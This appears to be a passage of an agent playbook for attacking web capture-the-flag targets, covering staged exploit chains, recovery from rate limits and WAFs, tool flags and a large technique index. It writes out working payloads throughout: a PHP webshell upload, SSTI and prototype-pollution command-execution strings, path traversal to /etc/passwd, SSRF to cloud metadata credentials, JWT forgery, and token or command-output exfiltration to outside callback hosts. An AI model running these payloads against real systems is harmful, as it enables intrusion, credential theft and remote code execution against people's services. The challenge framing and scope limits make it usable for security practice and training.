`Reasoning Checkpoint`: advanced-playbook evidence (which A-branch oracle fired + callbacks/cids) -> route (chain A1/A3/A8 vs single A2/A7 bypass vs stop) -> next (cheapest confirming stage first, capped).
## Multi-Step Chains (abstract patterns, technique-only)
Three generic shapes that cover most hard web challenges. Each lists stages + gates; substitute the actual app's endpoints. No live hosts, no flag values.
Chain 1 — Generic shop (cart + webhook + admin view): (1) store XSS marker in order note / address field (A5); (2) confirm admin-bot trigger page renders it (Playwright screenshot + DOM grep); (3) escalate marker to CSP-aware payload per A7 (JSONP gadget if inline blocked); (4) exfil session/token via OOB `<cid>` image/script URL (A4). Gate: bot-check failure (no visit after 2 min) -> Failure F4, do not resubmit payloads blindly.
Chain 2 — Generic blog (upload + template + metadata): (1) upload polyglot marker, fetch back to confirm render context (HTML vs text); (2) SSTI detect `{{7*7}}` vs `{{7*'7'}}` in title/body; (3) filter-bypass ladder (`attr`/`getattr`/hex-escaped dunders) single `id` only; (4) if egress exists, SSRF-style read of adjacent internal path OR metadata (A1) and convert to session forge. Gate: any step without oracle -> stop chain, hand off partial matrix.
Chain 3 — Generic admin-bot + auth (OTP/race + IDOR + second-order): (1) enumerate IDOR `/api/user/1..5` cap 10, find low-priv session; (2) OTP batch (10 codes/request max, stop at lockout signals); (3) store second-order payload as low-priv user in a field the admin view renders; (4) single race burst (A6, 5-wide) ONLY if a single-use primitive (claim/reset) gates the admin action. Gate: rate-limit or session invalidation -> F2/F3 recovery before any further stage.
`Reasoning Checkpoint`: chain evidence (stages passed 1..k + artifacts per stage) -> route (continue next stage vs downgrade to single-primitive vs blocked) -> next (cheapest unproven stage, never re-run passed stages).
## Failure-Mode Catalog + Recovery
| # | Failure | Detection (signal) | Recovery (bounded) |
|---|---|---|---|
| F1 | WAF silent drop (timeout/empty vs block page) | `time_total` >> baseline with no body; no block keywords | Confirm with benign resend (fast = drop is payload-caused); switch to A2 grammar ladder, 1 mutation/req, max 10 |
| F2 | Rate-limit lockout (`429` / `Retry-After` / tarpit) | 2x `429` or latency 5x baseline | STOP 10 min, halve concurrency, single-thread matrix only; never burst again this tier |
| F3 | Session invalidation (logout mid-chain) | `401/403` + new `Set-Cookie` / redirect to login | Re-login via Playwright/saved flow, re-baseline (Phase 1 mini, 5 req), replay last oracle once to confirm |
| F4 | Bot-check on admin-bot (no visit / challenge page) | No OOB hit in 2 min; CAPTCHA/checkbox text in trigger page | Verify callback egress first (benign `<cid>` image); simplify payload (no navigation); ONE resubmit; then escalate to operator |
| F5 | JSON vs form parsing differential (payload ignored) | Same payload works as form but not JSON or vice versa; `415`/`400` on one type | Send all three content-types per A2.2; keep the parse that executes, drop the others; record parser in `flagpath.json` |
| F6 | Cache interference (stale HIT masks oracle) | Identical body despite different payloads; `Age` grows; buster changes output | Add `?cb=<rand>` to every oracle request; compare MISS bodies only; re-test poison hypothesis per A8 with fresh buster |
| F7 | Output-encoding mirage (HTML-entity double-encode) | Payload visible in source as `&lt;script&gt;` or double-encoded | Double-encode control (Phase 3): identical signal = static reflection, downgrade to unconfirmed; try attribute/breakout contexts before giving up |
Each recovery is ONE bounded attempt; if it fails, mark the branch `blocked` with evidence and move to the next branch. Three blocked branches = tier stop (see Time-Budget Tiers).
`Reasoning Checkpoint`: failure evidence (which F-signal + counts) -> route (bounded recovery vs branch-blocked vs tier-stop) -> next (single recovery attempt or next branch).
## Version-Drift Guards
Tool CLIs drift (`dalfox url` -> `dalfox scan`, nuclei template paths/flags, ffuf filter flags). Gate every run:
```bash
ffuf --help | grep -E 'mc|fs|t |timeout'      # confirm -mc/-fs/-t/-timeout exist
dalfox --help | grep -E 'scan|blind|custom-payload'  # old `url` vs new `scan` subcommand
nuclei --help | grep -E 'severity|dast|headless|retries|timeout'
nuclei -update-templates && nuclei -tl 2>&1 | head -5  # template list sane before scan
sqlmap --help | grep -E 'tamper|technique|level|risk'
whatweb --help | head -3; wafw00f --help | head -5
```
Rules: (1) run the `--help` gate once per session per tool, log version (`tool --version` or `--help` header) into `flagpath.json`; (2) pin exact command + version in every artifact; (3) if a flag is missing, read `--help` and substitute (never guess flags); (4) template-based tools (nuclei/tplmap/SSTImap) update templates at session start, re-update if >24h old; (5) `tplmap` vs `SSTImap` flag sets differ (`--os-cmd` vs `-S`) — check help before pasting across tools.
Known-drift flags (re-check each session):
| Tool | Drifts observed | Gate |
|---|---|---|
| dalfox | `url` subcommand renamed `scan`; `--blind` / `--custom-payload` / `--only-custom-payload` presence | `dalfox --help` + `dalfox scan --help` |
| nuclei | `-severity` values, `-dast`/`-headless` DAST pair, `-retries`/`-timeout`/`-c` names, template IDs incl. `csp-bypass`, `cves/2025/*` | `nuclei --help` + `-update-templates` + `-tl` |
| ffuf | `-mc`/`-fs`/`-t`/`-timeout` filter syntax, FUZZ keyword handling | `ffuf --help` |
| sqlmap | `--tamper` script set, `--technique` letters, `--level`/`--risk` ranges | `sqlmap --help` |
| feroxbuster/gobuster | `-x`/`-C`/`--no-recursion` vs `vhost` subcommand flags | `<tool> --help` |
## Time-Budget Tiers
| Tier | Budget | Scope | Stop rule |
|---|---|---|---|
| Easy | <=15 min | Phase 1-2, top-2 params, known-class payload | No oracle in 40 req -> hand off matrix as `blocked` |
| Medium | <=45 min | Full Phases 1-4, top-3 params, 1 chain attempt | No confirmed oracle (Phase 3 fail) -> blocked, no exploit gate |
| Hard | <=2 h | Full + Advanced Playbook (2 branches max) + 1 chain (Chains 1-3) | 3 blocked branches (F-catalog) or chain cap 60 req -> escalate |
| Insane | escalate | No solo brute beyond 2h | At 2h without forged-token/RCE/file-read: package partial chains + OOB logs, call chaining-flagpath or operator |
Cross-tier rules: request caps still bind (total <=120/target unless Lead raises); WAF-block or 2x`429` pauses the clock (recovery time excluded); every tier ends with `flagpath.json` (even `blocked` verdicts include matrix + negative evidence).
`Reasoning Checkpoint`: budget evidence (elapsed + requests spent + branches blocked) -> route (continue tier vs tier-stop vs escalate) -> next (cheapest unblocked branch or handoff package).
## Escalation Triggers
Call `/forensics` (pcap of OWN traffic only): smuggling/desync suspected (need frame-level proof), OOB callbacks disputed (prove egress with own capture), session anomalies (prove cookie rotation). Capture scope: `tcpdump -i any host $URL_IP -w own.pcap` during replay only; never capture other tenants.
Call `chaining-flagpath` (multi-primitive synthesis): >=2 confirmed primitives that do not individually reach the flag (e.g., SSRF-read + JWT-forge, XSS + CSP-gated exfil, LFI + log-poison). Handoff must include per-stage oracles + cids + request counts.
Call `operator` (human gate): CAPTCHA/2FA/bot-checkbox blocks admin-bot (F4 exhausted), destructive-action confirmation (mass delete/password change), or legal/scope ambiguity (is metadataLoop in scope?). Use `tools/operator_ping.sh "<need>"` and keep solving unblocked branches meanwhile.
Never escalate without: baseline diff, oracle + negative evidence, attempt count, and exact replay command. Escalation is a handoff, not a retry loop.
## Worked End-to-End Example (abstracted, technique-only)
Generic target: a fictional shop app at `$URL` with avatar-URL import, JWT session cookie, and an admin view page. No real host, no flag value — replace `$URL`/`$OOB_HOST` at runtime.
1. Baseline (8 req): `curl` `/` + `robots.txt` + headers; note `Server` header + `session` JWT cookie + WAF absent. `inputs.json`: `avatar_url` (POST), `note` (POST), `id` (GET).
2. Matrix: `avatar_url=https://$OOB_HOST/a-<cid1>` -> DNS hit in 4s (SSRF blind confirmed). `note={{7*7}}` -> reflected `49` on order page (SSTI confirmed, Jinja2-shaped). `id='` -> 500 with SQL keywords (SQLi hint, weaker oracle — deprioritize).
3. Negatives: benign avatar URL fires control `<cid0>` (egress OK); `{{7*8}}` renders `56` (causal); double-encoded `{{7*7}}` does NOT execute (true template eval, not static).
4. Chain: SSRF-read `http://169.254.169.254/latest/meta-data/iam/security-credentials/` via `avatar_url` (bypass ladder unneeded — direct fetch worked, 1 req) -> response contains a key-like string -> `jwt_tool` decode shows `HS256` + `kid` -> sign forged `{"role":"admin"}` with leaked secret (1 req) -> replay order page as admin -> stored `note` SSTI now renders in admin view -> single `--os-cmd 'id;cat flag*'`-class read via SSTImap (1 gated cmd) -> flag-pattern grep matches.
5. Handoff: `flagpath.json` (stages: SSRF-blind cid, metadata body hash, JWT forge accept, SSTI admin render), raw responses, replay `curl` lines, total 34 requests / 22 min (medium tier). Causality: replay without payloads -> no metadata body, forged token rejected, admin note renders literally.
`Reasoning Checkpoint`: example trace (each stage's oracle + count) -> route (pattern matches Chains 1+2 hybrid) -> next (apply stage-gates to the live target, never copy payloads verbatim).
## Appendix: Blind-Oracle Choice + Budget Ledger
Pick the cheapest oracle that survives baseline noise. Measure noise first: 10x benign `curl -w %{time_total}`, record p50/p95/IQR.
| Oracle | Use when | Cost | Confirm rule |
|---|---|---|---|
| Error text | Verbose 500/SQL keywords on quote-break | 2-3 req | Keyword present on bad, absent on benign |
| Boolean diff | Reflective page, no errors | 6-10 req | Polarity flips both ways (`1=1` true AND `1=2` false) |
| Timing | No visible diff, stable latency (IQR <300ms) | 4-6 req | `SLEEP(0)` fast AND `SLEEP(5)` slow, twice each |
| OOB callback | Timing jittered (IQR >500ms) or no sleep sink | 3-5 req + listener | Unique `<cid>` fires; benign control `<cid0>` also fires (egress OK) |
| Length/hash diff | Large pages, subtle changes | 4-8 req | `difflib` ratio shift reproduces 2/2 runs |
Never stack oracles on one param: escalate error -> boolean -> timing -> OOB in that order, stop at the first reproducible one. Blind extraction rate cap: one row/byte per 2 requests; estimate total (`rows x cols x probes`) BEFORE dumping — if estimate exceeds remaining tier budget, dump the flag-like column only (`WHERE name LIKE '%flag%'`-shaped hunt, one table at a time).
Budget ledger (`matrix.csv`, one row per request — Lead audits this):
```csv
ts,method,url,param,class,cid,code,len,ms,verdict
1700000001,POST,$URL/avatar,avatar_url,oob-ssrf,a1b2c3d4,200,5123,812,callback-hit
1700000007,POST,$URL/note,note,ssti-detect,-,200,4988,301,49-rendered
1700000013,GET,$URL/item,id,quote-break,-,500,1204,190,sql-keywords
1700000020,POST,$URL/note,note,ssti-polarity,-,200,4988,295,56-rendered-causal
```
Per-stage artifact checklist (write after EACH stage, not at the end): raw request/response pair, oracle verdict + control results, `<cid>` list with callback timestamps, tool name + version, cumulative request count + elapsed. If the worker slot is preempted, the next worker resumes from the ledger alone — no re-probing.
Session hygiene across long chains: refresh `session=$S` at each Time-Budget Tier boundary; on any `401/403/new-cookie` re-run the 5-request Phase-1 mini-baseline and diff lengths (>20% shift = stack changed = re-fingerprint before continuing).
`Reasoning Checkpoint`: ledger evidence (oracle cost vs noise + remaining budget) -> route (cheapest surviving oracle vs tier-stop) -> next (extract flag-like column only, then handoff).
## Addendum: Modern-Stack Fingerprint (2024-2026 classes)
Probe these BEFORE declaring a target "no oracle" — hard challenges increasingly hide the sink in framework plumbing, not app params.
1. React Server Components / Next.js App Router: `Next-Action` / `X-Nextjs-Request-Id` headers, `/_next/static/` chunks, RSC flight payloads (`self.__next_f`). If present, check framework version against CVE-2025-55182 (React2Shell, CVSS 10.0, fixed in React 19.0.1/19.1.2/19.2.1) and CVE-2025-66478 (Next.js advisory) — version string first, no exploit without version match.
```bash
curl -sSI $URL | grep -iE 'next|vercel|x-powered-by'
nuclei -u $URL -t cves/2025/CVE-2025-55182 -timeout 15 -retries 1  # version-gated template only
```
2. Client-side prototype pollution -> XSS/RCE: probe `?__proto__[polluted]=yes`, `{"__proto__": {"x": "PPCHECK"}}`, `constructor.prototype` shapes; confirm via Playwright (`Object.prototype.polluted` readable in console) — never leave pollution persistent on shared infra, reload context after.
3. Server-side prototype pollution -> RCE (Node): `NODE_OPTIONS --import` sink class; detect via `__proto__` + slow/500 differential, confirm single `id`-class gadget only.
4. WebSocket sinks: enumerate `ws://`/`wss://` upgrade paths from JS bundles (`grep -oE 'wss?://[^"]+' app.*.js`), replay each message type with marker + polyglot; diff broadcast vs echo; auth control (fresh session must change signal).
5. GraphQL abuse ladder (capped): introspection -> field suggestions on errors -> batching (`[q1,q2]` alias arrays) -> depth/circular query (ONE 500-node probe, timeout 20s) -> mutation auth gaps (replay mutation as low-priv user once).
6. PDF/HTML-to-PDF renderer SSRF: path-traversal via URL-decode/double-encode quirks in the renderer fetch (`%252e%252e%252f` shapes); `phar://` deserialization only if renderer stack is PHP-shaped AND file-upload coexists (two-primitive gate, route via chaining-flagpath).
7. Full-text-search blind oracle (MySQL boolean-mode class): search-term operators (`+ - ~ * "`) + length-gated early exits turn result-vs-error redirects into a boolean oracle — treat like SQLi boolean (polarity both ways) with a 15-request cap.
Each class: fingerprint string first, benign-behavior probe second, single PoC third. No version string = no CVE exploit attempt.
`Reasoning Checkpoint`: modern-stack evidence (framework markers + version vs benign-probe behavior) -> route (CVE-gated template vs pollution/WS/GraphQL ladder vs stop) -> next (single PoC for the strongest marker only).
## References (repos / docs only, no target URLs)
- `github.com/sqlmapproject/sqlmap` (Usage wiki: techniques, tampers)
- `github.com/ffuf/ffuf` (wiki: FUZZ keyword, filters)
- `github.com/epi052/feroxbuster`
- `github.com/hahwul/dalfox` (docs: quick-start, CLI reference)
- `github.com/epinna/tplmap` (README: `--os-shell --os-cmd`)
- `github.com/vladko312/SSTImap` (`-S`, `-D`, `--os-shell`)
- `github.com/ticarpi/jwt_tool` (wiki: Attack Methodology, Using jwt_tool)
- `github.com/Paradoxis/Flask-Unsign` (README: decode/unsign/sign)
- hashcat mode `16500` (JWT) dictionary + best64.rule workflow
- `zbarimg` / `fcrackzip` noted in misc skill for QR/zip pivots
- `github.com/projectdiscovery/nuclei` + `github.com/projectdiscovery/nuclei-templates` (docs: `docs.projectdiscovery.io` — DAST `-dast -headless`, CSP-bypass templates)
- `github.com/projectdiscovery/interactsh` (OOB/DNSlog collaborator with correlation IDs)
- `owasp.org` WSTG JWT testing + SQLi-WAF-bypass notes; JWT cheat sheet `cheatsheetseries.owasp.org`
- `portswigger.net/web-security` (JWT attacks, request smuggling variants, XSS/CSP labs)
- `rfc-editor.org/rfc/rfc8725.html` (JWT best practices: kid/jku/x5u trust rules)
- `react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components` (CVE-2025-55182 React2Shell) + `nextjs.org/blog/CVE-2025-66478` (downstream Next.js)
- `github.com/sqlmapproject/sqlmap` tamper-script docs + `github.com/ffuf/ffuf` wiki (FUZZ keyword, filter flags) for drill-downs beyond the gates above
## Writeup-Distilled Patterns (W1..W68) — index (full patterns in techniques/)
Mined from 407 R1 + 450 R2 hard web writeups (see `knowledge/writeups_mined/web-ctf_manifest.md`, `web-ctf_manifest_r2.md`). Each file holds name -> signals -> steps -> payloads -> pitfalls -> 2-3 sources. Route here when base ladders stall.
| # | Pattern | When to use | File |
|---|---|---|---|
| W1 | Unicode-normalization quote bypass | quotes stripped, Python/Flask, email-format | techniques/writeup-patterns-1.md |
| W2 | Go-template exported-method RCE | Go `{{.User}}`, admin-only flag | techniques/writeup-patterns-1.md |
| W3 | Rare-engine SSTI via header | Caddy/unknown engine, UA reflected | techniques/writeup-patterns-1.md |
| W4 | Velocity without `$class` | Java Velocity, `$class` 500 | techniques/writeup-patterns-1.md |
| W5 | AI-WAF prompt-injection | GPT `H`/`R` gate + EJS | techniques/writeup-patterns-1.md |
| W6 | Split-brace SSTI | per-string `{`+`}` filter, joined logs | techniques/writeup-patterns-1.md |
| W7 | Blind `{% if %}` startswith oracle | `{{}}` blocked, `{% %}` free | techniques/writeup-patterns-1.md |
| W8 | Include-traversal + file-write SSTI | `include "errors/"+error`, writable templates | techniques/writeup-patterns-1.md |
| W9 | Signed-not-encrypted cookie leak | Flask `session['flag']`, secret dead-end | techniques/writeup-patterns-1.md |
| W10 | Filesystem-session pickle overwrite | `SESSION_TYPE=filesystem`, upload to session dir | techniques/writeup-patterns-1.md |
| W11 | PHP filter-chain RCE | LFI + b64 works, logs/input dead | techniques/writeup-patterns-1.md |
| W12 | .htaccess split-line bypass | Apache content+filename blocklists | techniques/writeup-patterns-1.md |
| W13 | PHAR-JPG polyglot trigger | JPG upload + `file_exists`/`phar://` toggle | techniques/writeup-patterns-2.md |
| W14 | Second-order register→profile SQLi | parameterized write, f-string read | techniques/writeup-patterns-2.md |
| W15 | QR-PDF second-order SQLi | QR decode → SQL, hash-linked stages | techniques/writeup-patterns-2.md |
| W16 | XPath `contains()` blind oracle | "no unsafe langs", truthy/falsy login | techniques/writeup-patterns-2.md |
| W17 | Mongo `$where` JS-break oracle | `includes('/q/')`/regex eval, 500 on quote | techniques/writeup-patterns-2.md |
| W18 | Relay global-ID `node()` IDOR | b64 `Type:id`, `__typename` open | techniques/writeup-patterns-2.md |
| W19 | Alias-batching auth brute | per-HTTP (not per-op) rate limit | techniques/writeup-patterns-2.md |
| W20 | `kid` SQLi key-sign | JWT `kid` SQL error | techniques/writeup-patterns-2.md |
| W21 | `jku` hosted-JWK forge | unvalidated `jku` fetch | techniques/writeup-patterns-2.md |
| W22 | RS→HS with public key | key in token, user→SQL | techniques/writeup-patterns-2.md |
| W23 | pac4j JWE confusion CVE-2026-29000 | pac4j 6.0.3 + open JWKS | techniques/writeup-patterns-2.md |
| W24 | LDAP wildcard oracle | `*` returns first user | techniques/writeup-patterns-2.md |
| W25 | SVG-upload XXE | SVG caption reflect, lxml entities | techniques/writeup-patterns-3.md |
| W26 | DOCX Content_Types XXE | docx upload, ZIP+XML | techniques/writeup-patterns-3.md |
| W27 | Blind XXE external-DTD b64 exfil | no reflect, `%` params allowed | techniques/writeup-patterns-3.md |
| W28 | Host-header reset/cache poison | reset link from `Host`, CTFd-class | techniques/writeup-patterns-3.md |
| W29 | Varnish `/imgs` session poison | Varnish caches `/imgs`, cookies cached | techniques/writeup-patterns-3.md |
| W30 | Next.js Server-Action SSRF | `Next-Action` + urllib 3.11 | techniques/writeup-patterns-3.md |
| W31 | `%0a` header-split smuggle | proxy builds headers from `?token=` | techniques/writeup-patterns-3.md |
| W32 | Twig-deser hybrid | PHAR + `file_exists` + Twig | techniques/writeup-patterns-3.md |
| W33 | CSS `:has()` nonce exfil | per-req nonce + `unsafe-inline` CSS | techniques/writeup-patterns-3.md |
| W34 | JPEG/JS polyglot CSP bypass | self-image script-src, contact upload | techniques/writeup-patterns-3.md |
| W35 | YAML `!!python/object/apply` | b64 `yaml:` URL tail, `yaml.load` | techniques/writeup-patterns-3.md |
| W36 | CherryPy traversal + GIF-pickle | username-joined upload, magic-only check | techniques/writeup-patterns-3.md |
| W37 | Coupon TOCTOU race | check-then-act + delay, single-use | techniques/writeup-patterns-3.md |
| W38 | PP `env.PATH` hijack | deepMerge + exec(zip), `delete env` | techniques/writeup-patterns-3.md |
| W39 | 0.CL/H2.CL desync + ERG | `CL: 0` ignored front, static asset fast | techniques/writeup-patterns-r2-1.md |
| W40 | WebSocket-smuggle 101/426 | `/check-url` SSRF + upgrade tunnel | techniques/writeup-patterns-r2-1.md |
| W41 | Apache CVE-2023-25690 CRLF smuggle | 2.4.55 mod_proxy `RewriteRule (.*)` | techniques/writeup-patterns-r2-1.md |
| W42 | WAF PCRE-flood bypass | sequential `preg_match`, no length cap | techniques/writeup-patterns-r2-1.md |
| W43 | Multipart parser-differential | WAF proxy + backend parse split | techniques/writeup-patterns-r2-1.md |
| W44 | JKU + open-redirect forge | `startsWith 127.0.0.1` + `/redirect` | techniques/writeup-patterns-r2-1.md |
| W45 | JKU + Host-header poison | `jku` from `Host`, reset link poison | techniques/writeup-patterns-r2-1.md |
| W46 | OTP `includes()` array bypass | `otp:["1"]` + `includes(valid)` | techniques/writeup-patterns-r2-1.md |
| W47 | GraphQL mega-batch 10k | per-HTTP limit, `guessNumber` | techniques/writeup-patterns-r2-1.md |
| W48 | GraphQL suggestion IDOR | introspection off, `Did you mean` | techniques/writeup-patterns-r2-1.md |
| W49 | PP merge + fork NODE_OPTIONS | `/config` merge + `/process` fork | techniques/writeup-patterns-r2-2.md |
| W50 | CSP redirect + Angular gadget | `self` + `/redirect`, DOMPurify | techniques/writeup-patterns-r2-2.md |
| W51 | CSP JSONP `callback` gadget | `script-src 'self'` + `/api/jsonp` | techniques/writeup-patterns-r2-2.md |
| W52 | CSP-less API + meta-refresh | dashboard CSP, `/api/notes` no CSP | techniques/writeup-patterns-r2-2.md |
| W53 | Cache-poison via smuggle | `X-Cache` + CL.TE + JS `max-age` | techniques/writeup-patterns-r2-2.md |
| W54 | Cache deception (WCD) leak | `/imgs` cached + session JSON | techniques/writeup-patterns-r2-2.md |
| W55 | IMDSv2 `instance-data` + PUT | webhook blocks IP, forwards headers | techniques/writeup-patterns-r2-2.md |
| W56 | SNI/multiline-header IMDS | 301 redirect + `Metadata: true` | techniques/writeup-patterns-r2-2.md |
| W57 | Jersey `;.` + H2 JDBC RCE | `isBaseFile` + `INI\T` backslash | techniques/writeup-patterns-r2-2.md |
| W58 | Fury/MapProxy二次 deser | `fury.deserialize` + allowlist null | techniques/writeup-patterns-r2-2.md |
| W59 | Lockfile race + CSP-drop | `bot.lock` + `max_input_vars` 1000 | techniques/writeup-patterns-r2-3.md |
| W60 | OAuth redirect + `temp_token` | `redirect_uri` traversal + 2FA leak | techniques/writeup-patterns-r2-3.md |
| W61 | CSWSH `READY` exfil | `wss:///chat`, no `Origin` check | techniques/writeup-patterns-r2-3.md |
| W62 | Thymeleaf SSTI-to-SSTI | `__${Referer}__` + `T()` blocked | techniques/writeup-patterns-r2-3.md |
| W63 | `escapeHTML` length-split | `formattedLength` + minifier NL | techniques/writeup-patterns-r2-3.md |
| W64 | CVE-2024-2961 iconv overflow | `ISO-2022-CN-EXT` 3B→4B | techniques/writeup-patterns-r2-3.md |
| W65 | `LD_PRELOAD`/`mail` bypass | `disable_functions` + `putenv` | techniques/writeup-patterns-r2-3.md |
| W66 | DOMPurify Unicode-overflow | `ļ/ľ` survive, ascii-decode | techniques/writeup-patterns-r2-3.md |
| W67 | `X-Forwarded-For` SQLite oracle | header SQLi + `ESCAPE ''` error | techniques/writeup-patterns-r2-3.md |
| W68 | Hash-ext + array-join SQLi | `md5(secret\|file)` + `join(data)` | techniques/writeup-patterns-r2-3.md |
`Reasoning Checkpoint`: pattern-index evidence (which W-signals matched + file) -> route (single W-pattern vs base ladder) -> next (cheapest W-steps first, capped).

## EASY-FIRST ladder (2026 training refresh — first 60s recon, then probes, ≤20 min)
1. Recon (always): `curl -s T/robots.txt T/sitemap.xml T/.git/HEAD`; `curl -s T/js/app.js | grep -io 'flag|api|key|token|fetch'`; follow `sourceMappingURL` `.js.map`.
2. Reflect probe trio: `{{7*7}}` (SSTI→49?), `' OR 1=1-- -` (SQLi login?), `?page=../../../etc/passwd` (LFI?).
3. Auth/cookie: base64-decode cookie → flip `role:user`→`admin`, `user_id`→1; JWT → `alg:none` + empty sig, then `kid` confusion; Flask → `flask-unsign --decode` then sign with `secret`.
4. GraphQL present → introspection `{__schema{...}}`, else `{__type(name:"User")}`; IDOR `user(id:1)`; alias-batch for OTP brute.
5. Upload `shell.png.php` (real 8-byte PNG magic + `<?php system($_GET["cmd"]);?>`), visit `/uploads/shell.png.php?cmd=id;ls ..`.
6. Fetch-param (`?url=`) → `127.0.0.1` service, then `::1`/`0x7f.0.0.1` if filtered, then `169.254.169.254` metadata; XML input → `<!ENTITY x SYSTEM "file:///etc/passwd">`; param → `;id` then `;cat /flag*`.
7. SQLi confirmed → `ORDER BY N` for column count → `UNION SELECT` → `sqlite_master` / `information_schema` → flag table.

## R4 field patterns (browser-swarm 2026 — from 479 new writeups)
- `.htaccess` escape: `AddType application/x-httpd-php .evil` + `shell.evil` (Apache only; nginx → polyglot-GIF + LFI include).
- Quote-stripped SSTI: `{{url_for.__globals__.os.popen(request.headers.X).read()}}` with `curl -H 'X: id'`; header mangling → `request.args.c`.
- Prototype-pollution → EJS RCE: `{"__proto__":{"outputFunctionName":"x;require('child_process').execSync('id')"}}` then render.
- Race windows: Turbo Intruder single-packet + gate sync; coupon/apply, cart/checkout, email-change races; NextJS `x-middleware-subrequest` bypass via header.
- NoSQL `$ne` login bypass; `kid: ../../dev/null` + null-byte forge; GraphQL introspection-off → `{__typename}` + field brute-forcing.
- Blind CMD: `||whoami>/var/www/images/t.txt||` + fetch, or `sleep 5` oracle; no write dir → `ping -c1 $(whoami).burp.net`.

Deep-read bodies (13 complete articles): techniques/r5-deep-reads.md.
